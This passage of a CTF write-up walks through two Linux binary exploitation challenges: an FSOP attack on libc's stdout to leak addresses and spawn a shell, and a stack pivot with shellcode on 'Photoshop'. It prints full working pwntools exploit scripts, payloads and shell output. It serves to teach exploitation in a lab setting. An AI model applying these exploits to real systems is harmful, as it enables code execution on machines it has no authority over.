    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    Stripped:   No
```

The challenge exposes yet another simple interface - in a while loop, a `malloc` request of 0x100 is made. The user is then asked for an offset, and then allowed to read in 0x100 bytes.

```c
// gcc -o chal chal.c -fstack-protector-all -Wl,-z,relro,-z,now -fpie -pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
char** buf_ptr = NULL;
int main() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  while (1) {
    char* buf = malloc(0x100);
    buf_ptr = &buf;
    int off = 0;
    printf("> ");
    scanf("%d", &off);
    printf("> ");
    read(0, *((char**)((char*)(&buf_ptr) + off)), 0x100);
  }

  _exit(1);
}
```

### Vulnerability

There is a weirdly suspicious line in the program source:

```c
    read(0, *((char**)((char*)(&buf_ptr) + off)), 0x100);
```

Let's break it down.

```c
(char *)(&buf_ptr) + off
```

The address of `buf_ptr` (which lives in the BSS) is first casted as a `char *` pointer. An offset `off` is then added to the pointer to form (1).

```c
((char **)((char *)(&buf_ptr) + off))
```

The pointer from (1) is then recasted as a `char **` pointer to form (2). The following visualisation might help:

```
char **bss_ptr (2) -> char *stack pointer -> char heap allocation[0x100]
```

```c
*((char **)((char *)(&buf_ptr) + off))
```

The `char **` pointer from (2) is then dereferenced to obtain the address that the bss pointer points to. (3)

```
char **bss_ptr (2) -> char *stack pointer (3) -> char heap allocation[0x100]
```

(3) is then passed into `read(0, (3), 0x100)`.

However, notice that if we pass in an offset to `&buf_ptr`:

```
char **(bss_ptr + offset) (2) -> char *different pointer (3)
```

Hence, because we can control what offset is passed into (2), we have an arbitrary "dereference-write" primitive, that allows us to write into pointers on the BSS.

### Write What Where?

There are not many pointers that live on the BSS or the binary that may be of interest. However, there are a few crucial pointers of interest that we could take advantage:

```
0x555555558000:	0x0000000000000000	0x0000555555558008
0x555555558010 <stdout@GLIBC_2.2.5>:	0x00007ffff7fb4760	0x0000000000000000
0x555555558020 <stdin@GLIBC_2.2.5>:	0x00007ffff7fb3a80	0x0000000000000000
0x555555558030 <buf_ptr>:	0x00007fffffffd160	0x0000000000000000
```

During runtime, the program often exposes pointers to the `FILE *stdout` and `FILE *stdin` FILE structures in libc. With our arbitrary deref-write primitive, we are able to write into the `stdout` and `stdin` FILE structures, allowing us to perform a File Stream Oriented Programming (FSOP) attack.

#### File Stream Oriented Programming (FSOP)

FSOP is a complicated and highly detailed exploitation technique that allows threat actors to not only gain arbitrary read and write primitives, but also [arbitrary code execution](https://blog.kylebot.net/2022/10/22/angry-FSROP/) through long code paths in libc that eventually propagate our controlled data into $RIP.

`stdout` and `stdin`, being file streams for input and output, live in LIBC as `FILE` structs.

```
/* offset      |    size */  type = struct _IO_FILE {
/* 0x0000      |  0x0004 */    int _flags;
/* XXX  4-byte hole      */
/* 0x0008      |  0x0008 */    char *_IO_read_ptr;
/* 0x0010      |  0x0008 */    char *_IO_read_end;
/* 0x0018      |  0x0008 */    char *_IO_read_base;
/* 0x0020      |  0x0008 */    char *_IO_write_base;
/* 0x0028      |  0x0008 */    char *_IO_write_ptr;
/* 0x0030      |  0x0008 */    char *_IO_write_end;
/* 0x0038      |  0x0008 */    char *_IO_buf_base;
/* 0x0040      |  0x0008 */    char *_IO_buf_end;
/* 0x0048      |  0x0008 */    char *_IO_save_base;
/* 0x0050      |  0x0008 */    char *_IO_backup_base;
/* 0x0058      |  0x0008 */    char *_IO_save_end;
/* 0x0060      |  0x0008 */    struct _IO_marker *_markers;
/* 0x0068      |  0x0008 */    struct _IO_FILE *_chain;
/* 0x0070      |  0x0004 */    int _fileno;
/* 0x0074: 0x0 |  0x0004 */    int _flags2 : 24;
/* 0x0077      |  0x0001 */    char _short_backupbuf[1];
/* 0x0078      |  0x0008 */    __off_t _old_offset;
/* 0x0080      |  0x0002 */    unsigned short _cur_column;
/* 0x0082      |  0x0001 */    signed char _vtable_offset;
/* 0x0083      |  0x0001 */    char _shortbuf[1];
/* XXX  4-byte hole      */
/* 0x0088      |  0x0008 */    _IO_lock_t *_lock;
/* 0x0090      |  0x0008 */    __off64_t _offset;
/* 0x0098      |  0x0008 */    struct _IO_codecvt *_codecvt;
/* 0x00a0      |  0x0008 */    struct _IO_wide_data *_wide_data;
/* 0x00a8      |  0x0008 */    struct _IO_FILE *_freeres_list;
/* 0x00b0      |  0x0008 */    void *_freeres_buf;
/* 0x00b8      |  0x0008 */    struct _IO_FILE **_prevchain;
/* 0x00c0      |  0x0004 */    int _mode;
/* 0x00c4      |  0x0014 */    char _unused2[20];

                               /* total size (bytes):  216 */
                             } 
```

By coaxing the values of different fields in the `FILE` structs, we can get `stdout` to write out an arbitrary number of bytes from any address range, giving us an info leak primitive, as well as code execution.

### Info Leak 

We first need to obtain an info leak that gives us either PIE base or libc base. While traditionally, we [do need to know where we exactly are writing from](https://docs.pwntools.com/en/stable/filepointer.html) to gain a fully controlled info leak primitive, nobodyisnobody [details a leakless leak technique that involves a partial overwrite in the `stdout` FILE structure](https://github.com/nobodyisnobody/docs/blob/main/using.stdout.as.a.read.primitive/README.md).

```python
def write(offset, content):
    p.sendlineafter(b'> ', str(offset).encode())
    p.sendafter(b'> ', content)

def leak():
    write(-32, p64(0xfbad1887) + p64(0)*3 + p8(0))
    return p.recv(145)

```

While we don't exactly know __where__ we are writing from, it is highly likely that our random leak would contain at least one libc pointer that we can use to calculate libc base:

```
[DEBUG] Sent 0x21 bytes:
    00000000  87 18 ad fb  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000020  00                                                  │·│
    00000021
[*] Switching to interactive mode
[DEBUG] Received 0xe5 bytes:
    00000000  00 00 00 00  00 00 00 00  00 5a ef 93  10 7f 00 00  │····│····│·Z··│····│
    00000010  ff ff ff ff  ff ff ff ff  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000020  80 38 ef 93  10 7f 00 00  00 00 00 00  00 00 00 00  │·8··│····│····│····│
    00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000050  00 00 00 00  00 00 00 00  e0 05 ef 93  10 7f 00 00  │····│····│····│····│
    00000060  87 18 ad fb  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000080  00 47 ef 93  10 7f 00 00  e3 47 ef 93  10 7f 00 00  │·G··│····│·G··│····│
    00000090  e3 47 ef 93  10 7f 00 00  e3 47 ef 93  10 7f 00 00  │·G··│····│·G··│····│
    000000a0  e4 47 ef 93  10 7f 00 00  00 00 00 00  00 00 00 00  │·G··│····│····│····│
    000000b0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    000000c0  00 00 00 00  00 00 00 00  80 3a ef 93  10 7f 00 00  │····│····│·:··│····│
    000000d0  01 00 00 00  00 00 00 00  ff ff ff ff  ff ff ff ff  │····│····│····│····│
    000000e0  00 00 00 3e  20                                     │···>│ │
    000000e5
\x00\x00\x00\x00\x00\x00\x00\x00\x00Z\xef\x93\x10\x7f\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x808\xef\x93\x10\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x05\xef\x93\x10\x7f\x00\x00\x87\x18\xad\xfb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00G\xef\x93\x10\x7f\x00\x00\xe3G\xef\x93\x10\x7f\x00\x00\xe3G\xef\x93\x10\x7f\x00\x00\xe3G\xef\x93\x10\x7f\x00\x00\xe4G\xef\x93\x10\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80:\xef\x93\x10\x7f\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00
```

Let's just receive all of them:

```python
def leak():
    write(-32, p64(0xfbad1887) + p64(0)*3 + p8(0))
    return p.recv(145)

write(-32, p64(0xfbad1887) + p64(0)*3 + p8(0))
p.interactive()
```

Looking at the 8 bytes from index 136 onwards, we can see a `\x7f` byte, indicating a libc pointer. We can re-run our script while checking in GDB what this pointer is:

```
gef> x 0x7f28a41857e3
0x7f28a41857e3 <_IO_2_1_stdout_+131>:	0x00000000
```

We can then finally calculate our libc base:

```python
write(-32, p64(0xfbad1887) + p64(0)*3 + p8(0))
libc.address = u64(leak()[136:144]) - libc.sym._IO_2_1_stdout_ - 131
log.info("libc.address, %#x", libc.address)
```

### Code Execution

In order to achieve code execution and get our shell, we can perform FSOP again by writing, yet again, to `stdout`. In theory, this is possible by exploiting a [House of Apple](https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/) which involves code execution through `_IO_wfile_overflow`, however in practice we do not spend much time crafting a payload manually. 

[nobodyisnobody](https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/exp_fsop.py) details an FSOP chain with a pre-created payload that we can easily paste into our exploit script and modify to our needs:

```python
stdout_lock = libc.address + 0x1d4a10 #_IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
# our gadget
gadget = libc.address + 0x00000000001405dc # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']		# the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')	# will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200		# _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

write(-32, bytes(fake))

p.interactive()
```

Writing this to `stdout` gives us our shell:

```
[*] libc.address, 0x7f8e22755000
[DEBUG] Sent 0x4 bytes:
    b'-32\n'
[DEBUG] Received 0x2 bytes:
    b'> '
[DEBUG] Sent 0xe8 bytes:
    00000000  01 01 01 01  01 01 01 3b  00 00 00 00  00 00 00 00  │····│···;│····│····│
    00000010  90 14 7a 22  8e 7f 00 00  00 00 00 00  00 00 00 00  │··z"│····│····│····│
    00000020  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000030  2f 62 69 6e  2f 73 68 00  00 00 00 00  00 00 00 00  │/bin│/sh·│····│····│
    00000040  00 00 00 00  00 00 00 00  dc 55 89 22  8e 7f 00 00  │····│····│·U·"│····│
    00000050  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000070  00 00 00 00  00 00 00 00  ff ff ff ff  ff ff ff ff  │····│····│····│····│
    00000080  00 00 00 00  00 00 00 00  10 9a 92 22  8e 7f 00 00  │····│····│···"│····│
    00000090  ff ff ff ff  ff ff ff ff  18 88 92 22  8e 7f 00 00  │····│····│···"│····│
    000000a0  60 89 92 22  8e 7f 00 00  00 00 00 00  00 00 00 00  │`··"│····│····│····│
    000000b0  00 00 00 00  00 00 00 00  80 87 92 22  8e 7f 00 00  │····│····│···"│····│
    000000c0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    000000d0  00 00 00 00  00 00 00 00  88 40 92 22  8e 7f 00 00  │····│····│·@·"│····│
    000000e0  00 00 00 00  00 00 00 00                            │····│····│
    000000e8
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x51 bytes:
    b'chal\tchal_patched  ld-linux-x86-64.so.2  solve.py\n'
    b'chal.c\tDockerfile    libc.so.6\n'
chal	chal_patched  ld-linux-x86-64.so.2  solve.py
chal.c	Dockerfile    libc.so.6
$ 
```

## Photoshop

This challenge was the only 1 out of 3 pwn challenges that had solves by the end of the finals, but is also by far one of the most interesting stack challenges I have ever done.

Two solutions so far have been heard, one involving using the gadgets already existing in the `icon.png` to ROP to a shell, and another one involving using a `ret` gadget in the `icon.png` to partial overwrite an address on the stack to return to `main`, manipulating a byte change feature to gain a `read` from `stdin` and thus execute shellcode.

This writeup shows the solution to the latter.

### Challenge Protections

```
[*] '/home/nikolawinata/Documents/ctf/sieberr/finals/photoshop/photoshop'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
    Debuginfo:  Yes
```

The binary `mmaps` a read-write memory region with the constant address 0x10000 and reads a provided `icon.png` into the region. It allows you to change a single byte in the region, before setting the region to read-execute, and then gives you a buffer overflow of 0x108 - 0x10.

Since the binary is protected with PIE, you are not able to use any gadgets in the binary.

```c
#include <stdio.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdlib.h>

#define IMAGE_SIZE 0x100000
                   0x100030

char *image;

int main(){
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    printf("Welcome to the best image editing software!\n");
    printf("Loading image...\n");
    sleep(3);

    image = mmap((void *)0x10000, IMAGE_SIZE, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    int fd = open("./icon.png", O_RDONLY);
    mprotect(image, IMAGE_SIZE, (PROT_READ|PROT_WRITE) & 7);
    int read_chars = read(fd, image, IMAGE_SIZE);

    if(read_chars < 0){
        printf("Something went wrong! Open a ticket.\n");
        exit(0);
    }

    int value = 0, index = 0;
    char buffer[0x10];

    printf("You can edit one pixel!\n");
    printf("Enter in the index you want to edit: ");

    scanf("%u", &index);

    if(index >= IMAGE_SIZE || index < 0){
        printf("Invalid!\n");
        return 0;
    }

    printf("Enter in the value: ");
    scanf("%d", &value);

    image[index] = (char)value;

    printf("Edit successful!\n");
    printf("Saving image...\n");
    sleep(3);

    mprotect(image, IMAGE_SIZE, ~(PROT_WRITE) & 7); // PROT_READ | PROT_EXEC

    printf("Enter in a review? ");
    read(0, buffer, 0x108);
}
```

### Binary Analysis

Disassembling `main` in GDB, we notice a key things:

```nasm
   0x0000555555555266 <+157>:	mov    DWORD PTR [rbp-0x4],eax
   0x0000555555555269 <+160>:	mov    rax,QWORD PTR [rip+0x2e10]        # 0x555555558080 <image>
   0x0000555555555270 <+167>:	mov    edx,0x3
   0x0000555555555275 <+172>:	mov    esi,0x100000
   0x000055555555527a <+177>:	mov    rdi,rax
   0x000055555555527d <+180>:	call   0x555555555090 <mprotect@plt>
   0x0000555555555282 <+185>:	mov    rcx,QWORD PTR [rip+0x2df7]        # 0x555555558080 <image>
   0x0000555555555289 <+192>:	mov    eax,DWORD PTR [rbp-0x4]
   0x000055555555528c <+195>:	mov    edx,0x100000
   0x0000555555555291 <+200>:	mov    rsi,rcx
   0x0000555555555294 <+203>:	mov    edi,eax
   0x0000555555555296 <+205>:	call   0x555555555070 <read@plt>
   0x000055555555529b <+210>:	mov    DWORD PTR [rbp-0x8],eax
   0x000055555555529e <+213>:	cmp    DWORD PTR [rbp-0x8],0x0
```

When `read` is called, `[rbp-0x4]` is placed into the `int fd` argument of `read`. Hence, if we can control `rbp`, we can set `rbp-4` to a region with a DWORD null to read from `stdin`.

```nasm
   0x00005555555553cd <+516>:	lea    rax,[rbp-0x20]
   0x00005555555553d1 <+520>:	mov    edx,0x108
   0x00005555555553d6 <+525>:	mov    rsi,rax
   0x00005555555553d9 <+528>:	mov    edi,0x0
   0x00005555555553de <+533>:	call   0x555555555070 <read@plt>
   0x00005555555553e3 <+538>:	mov    eax,0x0
   0x00005555555553e8 <+543>:	leave
=> 0x00005555555553e9 <+544>:	ret
```

When `read` is called again to give us our buffer overflow, it reads from `stdin` at `[rbp-0x20]`. This means that `rbp-0x20` must be a writable region.

Let us now look at the `icon.png` after it has been read into the memory region:

```
0x10000:	0x0a1a0a0d474e500a	0x524448490d000000
0x10010:	0xd0070000d0070000	0xc4389a0000000608
0x10020:	0x5948700900000079	0x0b0000120b000073
```

At offset 0x20, we notice that there is a three byte null followed by one non-null byte:

```
0x10020 0x00000079
```

Remember that we have a one-byte modification that we can use. This will come in handy.

Now, let us look at the stack after return address in `main`:

```
$rsp  0x7fffffffd158|+0x0000|+000: 0x00007ffff7dbb5f5 <__libc_start_call_main+0x75>  ->  0xe800018f84e8c789  <-  retaddr[1]
      0x7fffffffd160|+0x0008|+001: 0x00007fffffffd1a0  ->  0x00007ffff7ffd000 <_rtld_local>  ->  0x00007ffff7ffe310  ->  ...
      0x7fffffffd168|+0x0010|+002: 0x00007fffffffd278  ->  0x00007fffffffd75b  ->  0x696e2f656d6f682f '/home/nikolawinata/Documents/ctf/sieberr/finals/photoshop/photos[...]'  <-  $r12
      0x7fffffffd170|+0x0018|+003: 0x0000000155554040
      0x7fffffffd178|+0x0020|+004: 0x00005555555551c9 <main>  ->  0x20ec8348e5894855
      0x7fffffffd180|+0x0028|+005: 0x0000000000000000
      0x7fffffffd188|+0x0030|+006: 0xd12b509077521445
```

We can see that 4 QWORDs away from the return address, there is a pointer to `main`. If we had a ret slide up to that point in the stack, we could potentially partial overwrite the address pointer to return to any part of `main`.

Finally, let us look at `icon.png`:

```
00000840   59 1D 56 01  DC 7B CE 0A  ED D5 22 B8  94 B1 C6 7B  F2 E7 F0 99  2C 82 67 FA  Y.V..{...."....{....,.g.
00000858   22 FD 56 5F  D4 56 ED AB  F8 28 E9 FA  F4 E7 A8 BF  EB 93 B2 B2  4D EB 41 6C  ".V_.V...(..........M.Al
00000870   68 FF 32 5B  BB B6 8F 48  77 16 47 A4  63 A7 CF 55  4E F2 85 10  72 2D 27 5F  h.2[...Hw.G.c..UN...r-'_
00000888   92 2B AC 88  C3 2B F0 64  FA 47 92 6F  95 3B 56 95  6A 1C D5 C4  E3 A9 71 20  .+...+.d.G.o.;V.j.....q 
---  icon.png       --0x88C/0x5CE64--1%--------------------------------------------------------------------------
```

Notice that there is a `0xc3` byte at `0x88c`. In x86_64 assembly, `0xc3` is the opcode for a `ret` instruction. This means that we can use `image_base=0x10000+0x88c` as a `ret` gadget to ret-slide into the `main` pointer.

We have everything we need to formulate our exploit now.

### Exploit Formulation

#### Setting up a read into the image memory region

We will try to accomplish the following steps:

1. Turn our three-byte null into a four-byte null at offset 0x20
2. During our buffer overflow, we can then pivot `rbp` to `image_base + 0x24`, setting `[rbp-0x4]` to an `(int)0` that will be passed into our 0x1000 large read.
3. With four `ret`s, we can then partial overwrite the `main` pointer to return to the instruction just as `main` executes an `mprotect` to change the protections of the memory region from read-exec to read-write.

```python
ret = 0x1088c
partial = 0x5269
rbp = 0x10024

# p = process()
# gdb.attach(p)
p = remote('finals1.sieberr.live', 15003)

payload = b'A' * 0x20
payload += pack(rbp)
payload += pack(ret) * 4
payload += p16(partial)

p.sendline(str(0x20).encode())
p.sendline(b'0')
p.sendafter(b'review? ', payload)
```

```
-> 0x555555555296 e8d5fdffff            <main+0xcd>   call   0x555555555070 <read@plt>

   -> 0x555555555070 ff25aa2f0000          <read@plt>   jmp    QWORD PTR [rip + 0x2faa] # 0x555555558020 <read@got[plt]>
      0x555555555076 6804000000            <read@plt+0x6>   push   0x4
      0x55555555507b e9a0ffffff            <read@plt+0xb>   jmp    0x555555555020
      0x555555555080 ff25a22f0000          <__isoc23_scanf@plt>   jmp    QWORD PTR [rip + 0x2fa2] # 0x555555558028 <__isoc23_scanf@got.plt>
      0x555555555086 6805000000            <__isoc23_scanf@plt+0x6>   push   0x5
      0x55555555508b e990ffffff            <__isoc23_scanf@plt+0xb>   jmp    0x555555555020

    0x55555555529b 8945f8                <main+0xd2>   mov    DWORD PTR [rbp - 0x8], eax
    0x55555555529e 837df800              <main+0xd5>   cmp    DWORD PTR [rbp - 0x8], 0x0
    0x5555555552a2 7919                  <main+0xd9>   jns    0x5555555552bd <main+0xf4>
    0x5555555552a4 488d05a50d0000        <main+0xdb>   lea    rax, [rip + 0xda5] # 0x555555556050
    0x5555555552ab 4889c7                <main+0xe2>   mov    rdi, rax
----------------------------------------------------------------------------------------------------- arguments (from block) ----
0x7ffff7e9fd00 <__GI___libc_read> (
   int fd = 0x0000000000000000,
   void* buf = 0x0000000000010000  ->  0x0a1a0a0d474e5089,
   size_t nbytes = 0x0000000000100000  ->  0x0000000000000000,
)
```

Success! we have `read(0, 0x10000, 0x100000)` now. This means we can now craft a payload to return into an `execve` shellcode.

#### ret2execve

Since we have pivoted `rbp` to the image memory region, there are a few things we must note:

1. After `leave; ret` was executed in main, `rsp` now also lives in the image memory region.
2. Hence, the return address also lives in the image memory region, particularly at `image_base+0x24+8` since `rbp` was pivoted to `image_base+0x24`.
3. This means that when we are given the large read, we must not only read in our shellcode, we must also set up the stack for us to return to our shellcode.
4. Since our shellcode is executed __after__ the memory region is set to read-exec, it cannot use `push` or any other stack operations lest we segfault due to lack of write permissions.

We can craft an `execve` shellcode quickly:

```python
shellcode = asm(
    '''
    xor     rax, rax                
    mov     rbx, 65536
    mov     rdi, rbx                
    
    xor     rsi, rsi                
    xor     rdx, rdx                

    mov     al, 59                  
    syscall
    '''
)
```

As the usual convention is to `push rbx=binsh_pointer` to the stack and then use `rsp` as a pointer to our `/bin/sh` string, we must instead place our `/bin/sh` string at `image_base` and then use `image_base` as a pointer in `rdi`.

We can then craft our payload to return to the address in the image memory region where we place our shellcode:

```python
payload = b'/bin/sh\0'
payload = payload.ljust(0x24 + 8, b'A')
payload += pack(rbp+16)
payload += b'\x90' * 0x50
payload += shellcode

time.sleep(0.5)

p.send(payload)
```

After entering some mock values for the byte modification prompt and the buffer overflow read (both of which we do not need), we get our shell!

```
[DEBUG] Sent 0x9b bytes:
    00000000  2f 62 69 6e  2f 73 68 00  41 41 41 41  41 41 41 41  │/bin│/sh·│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000020  41 41 41 41  41 41 41 41  41 41 41 41  34 00 01 00  │AAAA│AAAA│AAAA│4···│
    00000030  00 00 00 00  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
    00000040  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
    *
    00000080  90 90 90 90  48 31 c0 48  c7 c3 00 00  01 00 48 89  │····│H1·H│····│··H·│
    00000090  df 48 31 f6  48 31 d2 b0  3b 0f 05                  │·H1·│H1··│;··│
    0000009b
[DEBUG] Sent 0x5 bytes:
    b'1000\n'
[DEBUG] Sent 0x2 bytes:
    b'0\n'
[DEBUG] Sent 0x1 bytes:
    b'\n'
[*] Switching to interactive mode
[DEBUG] Received 0x72 bytes:
    b'You can edit one pixel!\n'
    b'Enter in the index you want to edit: Enter in the value: Edit successful!\n'
    b'Saving image...\n'
You can edit one pixel!
Enter in the index you want to edit: Enter in the value: Edit successful!
Saving image...
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x13 bytes:
    b'Enter in a review? '
Enter in a review? [DEBUG] Received 0x2b bytes:
    b'icon.png  photoshop  photoshop.c  solve.py\n'
icon.png  photoshop  photoshop.c  solve.py
$
```

### Full exploit 

```python
from pwn import *
import time

elf = context.binary = ELF("./photoshop")
context.log_level = 'debug'
context.terminal = 'kitty'

ret = 0x1088c
partial = 0x5269
rbp = 0x10024

p = process()
# gdb.attach(p)
# p = remote('finals1.sieberr.live', 15003)

shellcode = asm(
    '''
    xor     rax, rax                
    mov     rbx, 65536
    mov     rdi, rbx                
    
    xor     rsi, rsi                
    xor     rdx, rdx                

    mov     al, 59                  
    syscall
    '''
)

payload = b'A' * 0x20
payload += pack(rbp)
payload += pack(ret) * 4
payload += p16(partial)

p.sendline(str(0x20).encode())
p.sendline(b'0')
p.sendafter(b'review? ', payload)

payload = b'/bin/sh\0'
payload = payload.ljust(0x24 + 8, b'A')
payload += pack(rbp+16)
payload += b'\x90' * 0x50
payload += shellcode

time.sleep(0.5)

p.send(payload)

p.sendline(b'1000')
p.sendline(b'0')
p.send(b'\n')

p.interactive()
```
